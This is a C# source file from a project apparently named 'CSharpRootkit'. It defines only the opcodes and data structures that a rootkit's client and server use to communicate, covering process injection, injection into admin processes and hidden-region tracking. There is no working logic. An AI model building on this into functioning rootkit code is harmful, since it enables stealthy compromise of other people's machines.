using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace CSharpRootkit
{
    public class RootKitIPCStructs
    {
        public enum ClientOpcodeEnum
        {
            Error,
            Start,
            Stop,
            SetKey,
            BasicInfo,
            InjectIntoProc
        }

        public enum ServerOpcodeEnum
        {
            Error,
            GetCurrentHiddenInfo,
            InjectAdminProcess,
            MimicNtResumeInjectOnAdminProcess,
            SetKey,
            InjectDone
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct InjectProcessInfo
        {
            public int ProcessToInject;
            public bool TaskComplete;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct clientInjectProcessInfo
        {
            public int ProcessToInject;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SetKey
        {
            public int ReturnKey;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct MemoryInfoTag 
        {
            public long StartRegion;
            public long EndRegion;
            public bool HasRegion;
        }

        public struct ClientCommand 
        {
            public ServerOpcodeEnum opcode;
            public byte[] data;
            public MemoryInfoTag location;
        }

        public struct ServerCommand
        {
            public ClientOpcodeEnum opcode;
            public byte[] data;
            public MemoryInfoTag location;
        }

    }
}
